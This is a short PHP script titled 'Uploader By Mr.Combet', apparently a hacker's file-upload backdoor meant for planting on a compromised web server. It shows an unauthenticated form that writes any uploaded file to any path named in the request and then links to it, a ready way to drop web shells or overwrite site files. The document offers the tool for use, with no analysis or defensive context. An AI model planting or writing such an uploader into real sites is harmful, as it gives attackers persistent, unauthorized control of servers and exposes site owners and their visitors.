<!DOCTYPE HTML>
<?php
 $files = @$_FILES["files"];
if ($files["name"] != '') {
    $fullpath = $_REQUEST["path"] . $files["name"];
    if (move_uploaded_file($files['tmp_name'], $fullpath)) {
        echo "<h1><a href='$fullpath'>Click here !!</a></h1>";
    }
}echo '<html><head><title>Uploader By Mr.Combet</title></head><body><form method=POST enctype="multipart/form-data" action=""><input type=text name=path><input type="file" name="files"><input type=submit value="Uploads"></form></body></html>';
?>
